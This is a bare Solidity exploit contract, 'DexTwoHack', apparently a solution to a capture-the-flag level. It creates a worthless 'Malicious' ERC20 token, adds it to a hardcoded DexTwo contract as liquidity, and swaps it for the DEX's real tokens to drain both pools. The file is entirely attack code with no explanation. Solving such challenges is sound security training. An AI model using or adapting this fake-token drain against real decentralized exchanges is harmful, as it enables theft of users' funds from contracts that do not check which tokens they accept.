// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;

import '@openzeppelin/contracts/token/ERC20/ERC20.sol';

interface IDexTwo {
    function token1() external returns (address);
    function token2() external returns (address);
    function swap(address, address, uint256) external;
    function add_liquidity(address, uint256) external;
}

contract DexTwoHack is ERC20 {
    IDexTwo public dexTwo = IDexTwo(0x6805a8A88872468991f18915648F4acFBACcFe63);

    constructor() public ERC20("Malicious", "MAL") {
        _mint(address(this), 400e18);
    }

    function swap() public {
        this.approve(address(dexTwo), balanceOf(address(this)));
        dexTwo.add_liquidity(address(this), 100e18);
        dexTwo.swap(address(this), dexTwo.token1(), 100e18);
        dexTwo.swap(address(this), dexTwo.token2(), 200e18);
    }
}
